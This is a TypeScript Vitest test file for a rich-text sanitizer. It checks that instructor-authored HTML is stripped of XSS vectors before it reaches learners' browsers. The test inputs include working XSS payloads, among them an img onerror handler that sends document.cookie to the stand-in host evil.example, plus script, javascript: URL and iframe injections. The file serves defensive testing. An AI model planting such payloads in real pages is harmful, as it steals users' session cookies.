import { describe, expect, it } from "vitest";
import { sanitizeRichText } from "./rich-text.sanitizer";

/**
 * The threat model: instructor sign-up is self-service, so anyone can author
 * content that later renders into a learner's browser via
 * `dangerouslySetInnerHTML`. These assert the payloads that made that
 * exploitable are stripped on the way IN.
 */
describe("sanitizeRichText", () => {
	it("strips the event-handler payload (the actual XSS vector)", () => {
		const out = sanitizeRichText(
			`<img src="x" onerror="fetch('https://evil.example/'+document.cookie)">`,
		);
		expect(out).not.toContain("onerror");
		expect(out).not.toContain("evil.example");
	});

	it("removes <script> entirely, content and all", () => {
		const out = sanitizeRichText(
			`<p>Hello</p><script>alert(document.domain)</script>`,
		);
		expect(out).not.toContain("<script");
		expect(out).not.toContain("alert(");
		expect(out).toContain("<p>Hello</p>");
	});

	it("drops javascript: links but keeps ordinary ones", () => {
		expect(
			sanitizeRichText(`<a href="javascript:alert(1)">x</a>`),
		).not.toContain("javascript:");
		const safe = sanitizeRichText(`<a href="https://example.com">docs</a>`);
		expect(safe).toContain('href="https://example.com"');
		// Outbound links can't reach back through window.opener.
		expect(safe).toContain('rel="noopener noreferrer"');
	});

	it("strips iframes, objects and inline styles", () => {
		const out = sanitizeRichText(
			`<iframe src="https://evil.example"></iframe><object data="x"></object><p style="background:url(javascript:1)">hi</p>`,
		);
		expect(out).not.toContain("<iframe");
		expect(out).not.toContain("<object");
		expect(out).not.toContain("style=");
		expect(out).toContain("hi");
	});

	it("preserves the formatting Tiptap actually produces", () => {
		const rich =
			"<h2>Title</h2><p><strong>bold</strong> and <em>italic</em></p><ul><li>one</li></ul><blockquote>quote</blockquote><pre><code>code</code></pre>";
		expect(sanitizeRichText(rich)).toBe(rich);
	});
});
